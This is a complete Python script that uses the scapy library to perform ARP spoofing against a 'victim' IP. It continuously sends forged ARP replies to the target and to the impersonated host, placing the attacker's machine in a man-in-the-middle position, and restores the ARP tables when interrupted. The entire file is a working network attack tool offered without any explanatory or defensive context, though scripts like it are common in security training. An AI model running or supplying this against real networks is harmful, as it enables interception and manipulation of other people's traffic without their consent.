import scapy.all as scapy
import optparse
import time


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="IP Address of the victim")
    parser.add_option("-s", "--spoof", dest="spoof", help="IP Address to spoof")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Enter a target, use --help")
    if not options.spoof:
        parser.error("[-] Enter an ip address to spoof, use --help")
    return options

def get_mac(ip):
    while True:
        arp_req = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_packet = broadcast/arp_req
        answered = scapy.srp(arp_packet, timeout=1, verbose=False)[0]
        try:
            if answered[0][1].hwsrc:
                break
        except IndexError:
            pass
    return answered[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(arp_packet, verbose=False)

def restore(ip_dest, ip_source):
    destination_mac = get_mac(ip_dest)
    source_mac = get_mac(ip_source)
    arp_packet = scapy.ARP(op=2, pdst=ip_dest, hwdst=destination_mac, psrc=ip_source, hwsrc=source_mac)
    scapy.send(arp_packet, count=4, verbose=False)

options = get_arguments()

packet_count = 0

while True:
    try:
        spoof(options.target, options.spoof)
        spoof(options.spoof, options.target)
        packet_count = packet_count + 2
        print("\r[+] {} packets sent to {}".format(packet_count, options.target), end="")
        time.sleep(2)
    except KeyboardInterrupt:
        print("\n[-] Quitting and restoring ARP tables")
        restore(options.target, options.spoof)
        restore(options.spoof, options.target)
        break
